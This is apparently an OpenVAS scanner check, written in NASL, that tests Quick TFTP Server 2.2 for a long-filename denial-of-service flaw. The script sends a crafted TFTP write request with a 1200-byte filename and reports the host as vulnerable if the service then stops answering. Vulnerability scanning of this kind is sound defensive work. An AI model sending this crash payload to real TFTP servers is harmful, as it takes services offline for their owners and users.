###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_quick_tftp_server_dos_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# Quick TFTP Server Long Filename Denial Of Service Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");

tag_impact = "Successful exploitation will allow attackers to cause denial of service
  attacks.";
tag_affected = "Quick TFTP Server version 2.2";
tag_insight = "The flaw is due to an error when handling a long file name read request,
  which can be exploited by remote unauthenticated attackers to crash an
  affected application.";
tag_solution = "No solution or patch is available as of 10th June, 2013. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.tallsoft.com/tftpserver.htm";
tag_summary = "This host is running Quick TFTP Server and is prone to
  denial of service vulnerability.";

if(description)
{
  script_id(803714);
  script_version("$Revision: 11 $");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-06-10 18:00:09 +0530 (Mon, 10 Jun 2013)");
  script_name("Quick TFTP Server Long Filename Denial Of Service Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/quick-tftp-22-denial-of-service");
  script_xref(name : "URL" , value : "http://www.iodigitalsec.com/blog/fuzz-to-denial-of-service-quick-tftp-server-2-2");

  script_description(desc);
  script_summary("Check for the denial of service vulnerability in Quick TFTP Server");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2013 Greenbone Networks");
  script_family("Denial of Service");
  script_require_keys("Services/udp/tftp");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0){
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("tftp.inc");

port = "";
soc = "";

## Check for tftp service
port = get_kb_item("Services/udp/tftp");
if(!port){
  port = 69;
}

## Check TFTP Port Status
if(!tftp_alive(port:port)){
  exit(0);
}

## open socket for udp port
soc = open_sock_udp(port);
if(!soc){
  exit(0);
}

## Construct the attack request
attack = raw_string(0x00, 0x02, 0x66, 0x69, 0x6c, 0x65, 0x2e, 0x74, 0x78,
                    0x74, 0x0 ) + raw_string(crap(data:raw_string(0x41),
                    length: 1200)) + raw_string(0x00);
send(socket:soc, data:attack);

close(soc);

## Confirm the server is dead
if(!tftp_alive(port:port)){
  security_hole(port);
}
